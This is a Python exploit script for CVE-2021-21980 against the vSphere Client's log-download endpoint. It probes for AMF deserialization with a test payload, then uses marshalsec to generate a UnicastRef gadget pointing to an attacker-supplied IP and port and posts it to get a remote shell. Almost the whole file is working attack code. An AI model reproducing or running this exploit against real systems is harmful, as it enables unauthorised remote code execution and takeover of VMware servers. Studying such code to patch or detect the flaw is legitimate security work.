import requests
import os 
import sys
import subprocess
import requests
requests.packages.urllib3.disable_warnings() 





banner = """
    @wabafet / @dorkerdevil AMF deserialization helper 
CVE-2021-21980
.____                           ___________      .__.__   
|    |    ____   ____    ____   \__    ___/____  |__|  |  
|    |   /  _ \ /    \  / ___\    |    |  \__  \ |  |  |  
|    |__(  <_> )   |  \/ /_/  >   |    |   / __ \|  |  |__
|_______ \____/|___|  /\___  /    |____|  (____  /__|____/
        \/          \//_____/                  \/         
        """
        
        
error_trigger = "Unknown AMF type \'65\'"

test_gadget = "QQ==" # 'A' is 65 well capital A in ascii hence it tossing the error we added to determine if its attempting to Deserialize data


real_gadget = "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF3 UnicastRef {} {} | base64 -w 0 | xargs"

attacker_ip = sys.argv[3]
coonectback_port = sys.argv[4]

def shell_maker(ip,port):
    cmd = real_gadget.format(ip,port)
    print(cmd)
    try:
        mycmd_result = subprocess.getoutput(cmd)
        if mycmd_result:

           return mycmd_result
    except Exception as ex2:
       print(ex2)
       pass     


def drop_rce(gadget_in):
    data = {
     'webClientSessionId': 'nope',
     'SelectedLogsSpec': gadget_in
    }
    try:
       response = requests.post('https://'+sys.argv[1]+':'+sys.argv[2]+'/vsphere-client/download/logs', data=data, verify=False)
       if response:
          print("Host Responded :"+sys.argv[1])
          print("*"*50)
       
       else:
          print(response.status_code)

    except Exception as ex:
        print(ex)
        pass  

def initiate_rce(ip_in,port,gadget_in):
    data = {
     'webClientSessionId': 'nope',
     'SelectedLogsSpec': gadget_in
    }
    try:
       response = requests.post('https://'+ip_in+':'+port+'/vsphere-client/download/logs', data=data, verify=False)
       if response.status_code == 500:
          print("Host Responded :")
          print("*"*50)
          tmp = response.text.splitlines()
        
          for items in tmp:
              if error_trigger in items:
                 print("Host Appearts to be Vulnerable and tried to cast a test gadget")
                 print("*"*50)
                 create_shell = shell_maker(attacker_ip,coonectback_port)
                 if create_shell:
                    created_shell = create_shell.strip()
                    print(created_shell)

                    try:
                         print("Attempting to Drop Final Shell")
                         drop_rce(created_shell)
                    except Exception as ex:
                        print(ex)
                        pass
       else:
          print(response.status_code)

    except Exception as ex:
        print(ex)
        pass

ip = sys.argv[1]
port = sys.argv[2]

print(banner)
initiate_rce(ip,port,test_gadget)

